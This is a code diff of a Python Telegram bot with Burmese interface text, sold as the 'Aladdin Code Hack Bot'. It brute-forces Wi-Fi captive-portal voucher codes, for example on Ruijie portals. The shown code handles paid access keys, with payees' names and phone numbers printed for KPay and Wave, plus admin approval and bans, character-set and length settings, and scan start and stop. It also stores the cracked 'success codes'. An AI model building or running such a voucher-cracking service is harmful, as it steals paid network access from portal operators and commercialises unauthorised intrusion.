-            await asyncio.gather(*workers, return_exceptions=True)
-
-    us.is_running = False
-    try:
-        await bot.edit_message_text(
-            chat_id=chat_id, message_id=us.status_message_id,
-            text=f"⏹ **စမ်းသပ်မှုကို ရပ်တန့်လိုက်ပါပြီ။**\n\n📊 စုစုပေါင်းစမ်းသပ်မှု: {us.attempts} ကြိမ်\n🏆 Success ရရှိမှု: {len(us.found_vouchers)} ခု"
-        )
-    except:
-        pass
-
-# ==================== HANDLERS ====================
-async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if is_admin(user_id):
-        await update.message.reply_text("👑 **Admin Panel မှ ကြိုဆိုပါသည် လူကြီးမင်း။**", reply_markup=admin_menu())
-    elif is_authorized(user_id):
-        await update.message.reply_text("✅ **လူကြီးမင်းတွင် Bot အသုံးပြုခွင့် ရှိပါသည်။**", reply_markup=user_menu())
-    else:
-        await update.message.reply_text(f"👋 **မင်္ဂလာပါ! ကွန်ရက် Voucher စမ်းသပ်စစ်ဆေးရေး Bot ဖြစ်ပါတယ်။**\n\n🚫 လူကြီးမင်းမှာ အသုံးပြုခွင့် Key မရှိသေးပါသည်။ ဆက်သွယ်ဝယ်ယူနိုင်ပါသည်။\n🆔 သင့် ID: `{user_id}`", reply_markup=unauthorized_menu(), parse_mode="Markdown")
-
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    text = update.message.text
-    state = user_states.get(user_id)
-
-    if not is_authorized(user_id) and not is_admin(user_id):
-        if text == "🔑 Access Key ဝယ်ယူရန်":
-            await update.message.reply_text(
-                "💎 **Code Hack Bot အသုံးပြုခွင့် နှုန်းထားများ** 💎\n\n"
-                "📱 **KBZPay / Wave Money** ဖြင့် ဝယ်ယူနိုင်ပါသည်။\n"
-                "💡 Ngwe လွှဲပြီးပါက အောက်က 'ငွေလွှဲပြေစာ ပေးပို့ရန်' ခလုတ်ကိုနှိပ်ပြီး ပြေစာပုံ ပို့ပေးပါ။",
-                reply_markup=unauthorized_menu()
-            )
-        elif text == "💵 Ngwe လွှဲပြေစာ ပေးပို့ရန်":
-            user_states[user_id] = "waiting_receipt"
-            await update.message.reply_text("📸 **ငွေလွှဲပြီးကြောင်း ပြေစာ Screenshot (ဓာတ်ပုံ) အား ပေးပို့ပေးပါ။**")
-        return
-
-    if is_admin(user_id) and state == "waiting_approve":
-        user_states.pop(user_id, None)
-        try:
-            parts = text.strip().split("|")
-            t_id = int(parts[0].strip())
-            days = int(parts[1].strip())
-            limit = int(parts[2].strip())
-            
-            authorized_users[t_id] = {
-                "expires": datetime.now() + timedelta(days=days),
-                "daily_limit": limit,
-                "found_today": 0,
-                "last_reset": datetime.now().date(),
-            }
-            await update.message.reply_text(f"✅ အောင်မြင်ပါသည်! User: `{t_id}` ကို ခွင့်ပြုလိုက်ပါပြီ။", reply_markup=admin_menu())
-            return
-        except:
-            await update.message.reply_text("❌ ပုံစံမှားယွင်းနေပါသည်။", reply_markup=admin_menu())
-            return
-
-    if state == "waiting_portal_link":
-        user_states.pop(user_id, None)
-        us = get_user_session(user_id)
-        us.portal_url = text.strip()
-        
-        host_match = re.search(r'(https?://[^/]+)', us.portal_url)
-        if host_match:
-            base_domain = host_match.group(1)
-            if "ruijienetworks.com" in base_domain:
-                us.base_url = base_domain
-            else:
-                if ":" in base_domain.replace("http://", "").replace("https://", ""):
-                    us.base_url = base_domain
+        # --- ADMIN BAN COMMAND LOGIC ---
+        if user_id == ADMIN_ID and session.state == "waiting_for_ban_id":
+            try:
+                target_ban_id = int(text_data)
+                if str(target_ban_id) in data_manager.data["authorized_users"]:
+                    data_manager.deauthorize(target_ban_id)
+                    
+                    if target_ban_id in user_sessions:
+                        us = user_sessions[target_ban_id]
+                        us.stop_event.set()
+                        if us.scan_task: us.scan_task.cancel()
+                        del user_sessions[target_ban_id]
+                        
+                    await bot.reply_to(message, f"✅ <b>User {target_ban_id} အား အောင်မြင်စွာ ပယ်ဖျက်ပြီးပါပြီ။</b>", reply_markup=get_admin_panel_keyboard(), parse_mode="HTML")
                 else:
-                    us.base_url = f"{base_domain}:2060"
-        else:
-            us.base_url = "https://portal-as.ruijienetworks.com"
+                    await bot.reply_to(message, "❌ အဆိုပါ ID မှာ ခွင့်ပြုထားသော စာရင်းထဲတွင် မရှိပါ။")
+            except:
+                await bot.reply_to(message, "❌ တရားဝင်သော numeric ID ကိုသာ ရိုက်ထည့်ပါ။")
+            session.state = None
+            return
+
+        # --- USER INPUT PORTAL URL ---
+        if session.state == "waiting_for_url":
+            if not (text_data.startswith("http://") or text_data.startswith("https://")):
+                await bot.reply_to(message, "❌ Invalid URL. Must start with http:// or https://")
+            elif data_manager.add_user_url(user_id, text_data):
+                await bot.reply_to(message, "✅ URL added successfully!", reply_markup=get_user_keyboard(user_id))
+            else:
+                await bot.reply_to(message, "⚠️ This URL is already in your list.", reply_markup=get_user_keyboard(user_id))
+            session.state = None
+            return
+
+        # --- PUBLIC COMMANDS / UN-AUTHORIZED KEYBOARD ---
+        if text_data == "🛒 Access Key ဝယ်ယူရန်":
+            text = (
+                "⚡ <b>Aladdin Code Hack Bot ဈေးနှုန်းများ</b> ⚡\n"
+                "━━━━━━━━━━━━━━━━━━━━━━━\n"
+                "📅 <b>15 Days</b> - <code>15,000 Ks</code>\n"
+                "📅 <b>30 Days</b> - <code>21,000 Ks</code>\n"
+                "━━━━━━━━━━━━━━━━━━━━━━━\n"
+                "💰 <b>ငွေလွှဲရန် - KPay</b>\n"
+                "📱 <code>09973214939</code>\n"
+                "👤 <b>Hein Min Thant</b>\n\n"
+                "💰 <b>ငွေလွှဲရန် - Wave</b>\n"
+                "📱 <code>09264389341</code>\n"
+                "👤 <b>Hein Min Chit</b>\n"
+                "━━━━━━━━━━━━━━━━━━━━━━━\n"
+                "⚠️ Ngwe Lwe Pyay Sar Po Yan ခလုတ်နှိပ်၍ ပေးပို့ပေးပါဦးခင်ဗျာ။"
+            )
+            await bot.reply_to(message, text, parse_mode="HTML")
+            return
             
-        await update.message.reply_text(
-            f"✅ **Portal Link ကို မှတ်သားပြီးပါပြီ!**\n\n"
-            f"🌐 **Link:** {us.portal_url}\n"
-            f"📡 **Detected Base:** {us.base_url}", 
-            reply_markup=admin_menu() if is_admin(user_id) else user_menu()
-        )
-        return
+        elif text_data == "💵 Ngwe Lwe Pyay Sar Po Yan":
+            await bot.reply_to(message, "📸 <b>ကျေးဇူးပြု၍ Ngwe Lwe Pyay Sar (Screenshot Photo) အား တိုက်ရိုက် ပို့ပေးပါခင်ဗျာ။</b>")
+            return
 
-    if text == "🌐 Portal Link ထည့်သွင်းရန်":
-        user_states[user_id] = "waiting_portal_link"
-        await update.message.reply_text("🔗 **လူကြီးမင်း၏ Wi-Fi Portal Login Link အား Copy ကူး၍ ပို့ပေးပါ။**")
-    
-    elif text == "🚀 Voucher စမ်းသပ်ခြင်း စတင်ရန်":
-        us = get_user_session(user_id)
-        if not us.portal_url:
-            await update.message.reply_text("⚠️ **ကျေးဇူးပြု၍ Portal Link ကို အရင်ထည့်သွင်းပေးပါဦး။**")
+        # Core Authorize Gate for menus
+        if not data_manager.is_authorized(user_id):
+            await bot.reply_to(message, "❌ သင့်တွင် ဤ Bot အား သုံးခွင့်မရှိသေးပါ။ ပြေစာ ပေးပို့ပေးပါ။", reply_markup=get_unauth_keyboard())
             return
-        if us.is_running:
-            await update.message.reply_text("⚠️ **လက်ရှိတွင် ရှာဖွေမှု ပြုလုပ်နေဆဲဖြစ်ပါသည်။**")
-            return
+
+        # --- STANDARD KEYBOARD NAVIGATION ---
+        if text_data == "🔗 ADD PORTAL URL":
+            session.state = "waiting_for_url"
+            await bot.reply_to(message, "Please send the Portal URL you want to add.")
             
-        keyboard = InlineKeyboardMarkup(
-            [
-                [InlineKeyboardButton("🔢 ဂဏန်းသီးသန့် (Digit)", callback_data="mode_digit")],
-                [InlineKeyboardButton("🔤 စာလုံးအသေးသီးသန့် (Lower)", callback_data="mode_lower")],
-                [InlineKeyboardButton("🔤 စာလုံးအကြီးသီးသန့် (Upper)", callback_data="mode_upper")],
-                [InlineKeyboardButton("🔣 အလုံးစုံကုဒ် (All Mix)", callback_data="mode_all")]
-            ]
-        )
-        await update.message.reply_text("⚙️ **စမ်းသပ်မည့် ကုဒ်အမျိုးအစား (Voucher Mode) ရွေးချယ်ပါ -**", reply_markup=keyboard)
+        elif text_data == "📄 MY URLS":
+            u_data = data_manager.get_user_data(user_id)
+            urls = u_data["urls"]
+            if not urls:
+                text = "You haven't added any URLs yet."
+                markup = None
+            else:
+                text = "<b>Your URLs:</b>\n\n" + "\n".join([f"{i+1}. {u[:70]}..." for i, u in enumerate(urls)])
+                markup = InlineKeyboardMarkup()
+                markup.row(InlineKeyboardButton(text="🗑 CLEAR ALL URLS", callback_data="clear_urls"))
+            await bot.reply_to(message, text, reply_markup=markup, parse_mode="HTML")
 
-    elif text == "📊 အခြေအနေ စစ်ဆေးရန်":
-        us = get_user_session(user_id)
-        status = "🟢 အလုပ်လုပ်နေသည်" if us.is_running else "🔴 ရပ်တန့်ထားသည်"
-        await update.message.reply_text(
-            f"📊 **လက်ရှိ Bot လုပ်ဆောင်မှုအခြေအနေ**\n\n"
-            f"📡 အခြေအနေ: {status}\n"
-            f"🔢 ယခု Session စမ်းသပ်ပြီး: {us.attempts} ကြိမ်\n"
-            f"🏆 တွေ့ရှိမှု: {len(us.found_vouchers)} ခု",
-            reply_markup=admin_menu() if is_admin(user_id) else user_menu()
-        )
+        # New Keyboard Logic to View Saved Success Codes
+        elif text_data == "📄 MY SUCCESS CODES":
+            u_data = data_manager.get_user_data(user_id)
+            success_list = u_data.get("success_codes", [])
+            if not success_list:
+                text = "⚠️ <b>သင့်ထံတွင် ရှာဖွေတွေ့ရှိထားသော Success Code မရှိသေးပါခင်ဗျာ။</b>"
+                markup = None
+            else:
+                text = "🎯 <b>သင်ရှာဖွေတွေ့ရှိထားသော Success Codes များ-</b>\n"
+                text += "<i>(စာလုံးပေါ်ဖိရုံဖြင့် အလွယ်တကူ Copy ကူးယူနိုင်ပါသည်)</i>\n\n"
+                for i, code in enumerate(success_list):
+                    text += f"{i+1}. <code>{code}</code>\n"
+                
+                markup = InlineKeyboardMarkup()
+                markup.row(InlineKeyboardButton(text="🗑 CLEAR SUCCESS CODES (ဖျက်ပစ်ရန်)", callback_data="clear_success_codes"))
+            await bot.reply_to(message, text, reply_markup=markup, parse_mode="HTML")
+            
+        elif text_data == "⚙️ SETUP CONFIG MOD":
+            markup = InlineKeyboardMarkup()
+            markup.row(InlineKeyboardButton(text="🔢 Numbers (0-8)", callback_data="set_m_num"))
+            markup.row(InlineKeyboardButton(text="🔤 Alpha (a-z)", callback_data="set_m_alpha"))
+            markup.row(InlineKeyboardButton(text="🔀 Mixed", callback_data="set_m_mixed"))
+            await bot.reply_to(message, "Select Character Set:", reply_markup=markup)
+            
+        elif text_data == "🚀 START SCAN":
+            u_data = data_manager.get_user_data(user_id)
+            if not u_data["urls"]:
+                await bot.reply_to(message, "⚠️ Add at least one URL first!")
+                return
+            
+            today_hits = data_manager.get_today_hits(user_id)
+            user_info = data_manager.get_user_info(user_id)
+            max_limit = user_info.get("daily_limit", 10)
+            
+            # Admin ဖြစ်ခဲ့ရင် Limit Check ကို ကျော်သွားစေချင်ရင် (သို့) ♾️ အမြဲအလုပ်လုပ်စေချင်ရင်
+            if user_id != ADMIN_ID and today_hits >= max_limit:
+                await bot.reply_to(message, f"⚠️ ယနေ့အတွက် သတ်မှတ်ထားသော အမြင့်ဆုံး Limit ({max_limit}) ပြည့်သွားပါပြီ။")
+                return
 
-    elif text == "⏹ စမ်းသပ်မှု ရပ်တန့်ရန်":
-        us = get_user_session(user_id)
-        if us.is_running:
-            us.stop_flag = True
-            await update.message.reply_text("⏳ **လုပ်ငန်းစဉ်ကို ရပ်တန့်ရန် အမိန့်ပေးပို့လိုက်ပါပြီ...**")
-        else:
-            await update.message.reply_text("❌ လက်ရှိတွင် မည်သည့်ရှာဖွေမှုမှ ပြုလုပ်မနေပါ။")
+            if session.scan_task and not session.scan_task.done():
+                await bot.reply_to(message, "⚠️ Scanner is already running.")
+                return
+            
+            session.reset_stats()
+            status_msg = await bot.reply_to(message, "🚀 Initializing Scanner Dashboard...", parse_mode="HTML")
+            session.status_msg_id = status_msg.message_id
+            session.scan_task = asyncio.create_task(main_scanner_task(user_id))
 
-    elif text == "🏆 ရရှိထားသော Success Codes":
-        us = get_user_session(user_id)
-        if not us.found_vouchers:
-            await update.message.reply_text("ℹ️ **မည်သည့် Success Code မှ မတွေ့ရှိရသေးပါခင်ဗျာ။**")
-            return
-        msg = "🏆 **Corporate Success Voucher Codes** 🏆\n\n"
-        for idx, v in enumerate(us.found_vouchers, 1):
-            msg += f"{idx}။ 🔑 ကုဒ်: `{v['code']}` | သက်တမ်း: {v['validity']}\n"
-        await update.message.reply_text(msg, parse_mode="Markdown")
+        elif text_data == "🔑 ADMIN PANEL" and user_id == ADMIN_ID:
+            session.state = None
+            await bot.reply_to(message, "👑 <b>WELCOME TO ADMIN MASTER SYSTEM</b>", reply_markup=get_admin_panel_keyboard(), parse_mode="HTML")
 
-    elif text == "🗑️ Success Codes အားလုံးဖျက်ရန်":
-        us = get_user_session(user_id)
-        us.found_vouchers.clear()
-        await update.message.reply_text("🗑️ **အောင်မြင်စွာ ဖျက်သိမ်းပြီးပါပြီ။**")
+        elif text_data == "👥 Admin ခွင့်ပြုပေးထားသော User များ" and user_id == ADMIN_ID:
+            users = data_manager.data["authorized_users"]
+            if not users:
+                await bot.reply_to(message, "လက်ရှိတွင် ခွင့်ပြုထားသော User မရှိသေးပါ။")
+                return
+            report = "👥 <b>ခွင့်ပြုထားသော User စာရင်း-</b>\n\n"
+            for uid, info in users.items():
+                report += f"• <code>{uid}</code> | {info.get('expiry')} | Limit: {info.get('daily_limit')} Hits\n"
+            await bot.reply_to(message, report, parse_mode="HTML")
 
-async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_states.get(user_id) == "waiting_receipt":
-        user_states.pop(user_id, None)
-        await update.message.reply_text("✅ **ပြေစာကို Admin ထံသို့ ပေးပို့လိုက်ပါပြီ။**")
+        elif text_data == "🚫 ခွင့်ပြုထားသော user များအား ပယ်ဖျက်ရန်" and user_id == ADMIN_ID:
+            users = data_manager.data["authorized_users"]
+            if not users:
+                await bot.reply_to(message, "ပယ်ဖျက်ရန် User စာရင်း မရှိသေးပါ။")
+                return
+            
+            report = "🚫 <b>လက်ရှိအသုံးပြုနေသော User ID များ-</b>\n\n"
+            for uid, info in users.items():
+                report += f"• <code>{uid}</code> ({info.get('expiry')})\n"
+            
+            report += "\n━━━━━━━━━━━━━━━━━━━━━━━\n"
+            report += "✍️ <b>ပယ်ဖျက်လိုပါက အောက်ပါအတိုင်း ID တစ်ခုတည်းကို သီးသန့် ရိုက်ပို့ပေးပါ-</b>\n"
+            report += "ဥပမာ - <code>685224104</code>"
+            
+            session.state = "waiting_for_ban_id"
+            await bot.reply_to(message, report, parse_mode="HTML")
 
-async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    data = query.data
-    user_id = query.from_user.id
-    chat_id = query.message.chat_id
+        elif text_data == "🔙 BACK TO MAIN" or text_data == "🔙 BACK":
+            session.state = None
+            await bot.reply_to(message, "Main Menu သို့ ပြန်ရောက်ပါပြီ။", reply_markup=get_user_keyboard(user_id))
 
-    if data.startswith("mode_"):
-        mode = data.replace("mode_", "")
-        us = get_user_session(user_id)
-        us.current_mode = mode
-        
-        keyboard = InlineKeyboardMarkup(
-            [[
-                InlineKeyboardButton("6 လုံး", callback_data="len_6"),
-                InlineKeyboardButton("7 လုံး", callback_data="len_7"),
-                InlineKeyboardButton("8 လုံး", callback_data="len_8")
-            ]]
-        )
-        await query.edit_message_text(text=f"🔢 **Voucher ၏ Сာလုံးအရှည် (Length) ကို ရွေးချယ်ပါ -**", reply_markup=keyboard)
+# ---------------------- INLINE CALLBACK BUTTONS HANDLERS ----------------------
+@bot.callback_query_handler(func=lambda call: call.data == "clear_success_codes")
+async def inline_clear_success_codes(call):
+    user_id = call.from_user.id
+    data_manager.clear_success_codes(user_id)
+    await bot.answer_callback_query(call.id, "Success Codes အားလုံးကို ဖျက်ပြီးပါပြီ။", show_alert=True)
+    await bot.edit_message_text("🗑 <b>ရှာဖွေထားသော Success Code အားလုံးကို သန့်ရှင်းဖျက်ဆီးပြီးပါပြီ။</b>", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML")
 
-    elif data.startswith("len_"):
-        length = int(data.replace("len_", ""))
-        us = get_user_session(user_id)
-        us.current_length = length
-        
-        await query.edit_message_text(text=f"🚀 **Ultimate Turbo အင်ဂျင်ကို နှိုးနေပါပြီ...**")
-        asyncio.create_task(high_speed_bruteforce(context.bot, chat_id, user_id))
+@bot.callback_query_handler(func=lambda call: call.data == "clear_urls")
+async def inline_clear_urls(call):
+    user_id = call.from_user.id
+    data_manager.clear_user_urls(user_id)
+    await bot.answer_callback_query(call.id, "All URLs cleared!")
+    await bot.edit_message_text("🗑 All URLs have been deleted successfully.", chat_id=call.message.chat.id, message_id=call.message.message_id)
 
-# ==================== WEB SERVER FOR RENDER ====================
-async def health_check(request):
-    return web.Response(text="Aladdin Bot Server is 100% Live and Stable!")
+@bot.callback_query_handler(func=lambda call: call.data == "stop_scan")
+async def inline_stop_scan(call):
+    user_id = call.from_user.id
+    session = get_session(user_id)
+    session.stop_event.set()
+    if session.scan_task:
+        session.scan_task.cancel()
+        try: await session.scan_task
+        except asyncio.CancelledError: pass
+    session.scan_task = None
+    await bot.answer_callback_query(call.id, "🛑 Scanner paused.")
+    await bot.edit_message_text("🛑 <b>Scanner Stopped & Paused Successfully!</b>", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML")
 
+@bot.callback_query_handler(func=lambda call: call.data == "set_m_num")
+async def cb_set_m_num(call):
+    user_id = call.from_user.id
+    data_manager.update_user_settings(user_id, "char_set", "012345678")
+    await prompt_length_selection(call)
+
+@bot.callback_query_handler(func=lambda call: call.data == "set_m_alpha")
+async def cb_set_m_alpha(call):
+    user_id = call.from_user.id
+    data_manager.update_user_settings(user_id, "char_set", string.ascii_lowercase)
+    await prompt_length_selection(call)
+
+@bot.callback_query_handler(func=lambda call: call.data == "set_m_mixed")
+async def cb_set_m_mixed(call):
+    user_id = call.from_user.id
+    data_manager.update_user_settings(user_id, "char_set", "012345678" + string.ascii_lowercase)
+    await prompt_length_selection(call)
+
+async def prompt_length_selection(call):
+    markup = InlineKeyboardMarkup()
+    for i in [6, 7, 8]:
+        markup.row(InlineKeyboardButton(text=f"{i} Digits", callback_data=f"set_l_{i}"))
+    await bot.edit_message_text("Select Code Length:", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("set_l_"))
+async def cb_set_len(call):
+    user_id = call.from_user.id
+    length = int(call.data.split("_")[-1])
+    data_manager.update_user_settings(user_id, "code_len", length)
+    await bot.answer_callback_query(call.id, "Settings updated successfully!")
+    await bot.edit_message_text("⚙️ <b>Config settings saved! Ready to scan.</b>", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML")
+
+# ---------------------- STARTING THE PLATFORM ----------------------
 async def main():
-    if not BOT_TOKEN:
-        logger.error("CRITICAL: BOT_TOKEN is missing!")
-        sys.exit(1)
-
-    app_tg = Application.builder().token(BOT_TOKEN).build()
-    app_tg.add_handler(CommandHandler("start", start_command))
-    app_tg.add_handler(CallbackQueryHandler(handle_callback))
-    app_tg.add_handler(MessageHandler(filters.PHOTO, handle_photo))
-    app_tg.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-    
-    await app_tg.initialize()
-    await app_tg.start()
-    await app_tg.updater.start_polling(drop_pending_updates=True)
-    logger.info("Telegram Bot Started via Polling Mode.")
-
-    app_web = web.Application()
-    app_web.router.add_get('/', health_check)
-    
-    port = int(os.environ.get("PORT", 8080))
-    runner = web.AppRunner(app_web)
-    await runner.setup()
-    site = web.TCPSite(runner, '0.0.0.0', port)
-    await site.start()
-    
-    try:
-        while True:
-            await asyncio.sleep(3600)
-    except (KeyboardInterrupt, SystemExit):
-        pass
-    finally:
-        await app_tg.updater.stop()
+    print("[*] Starting Premium Aladdin Code Hack Bot Platform...")
+    await bot.polling(non_stop=True)
 
 if __name__ == "__main__":
-    if sys.platform == 'win32':
-        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
-    asyncio.run(main())
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("\n[!] Bot Closed Safely.")
+        sys.exit(0)
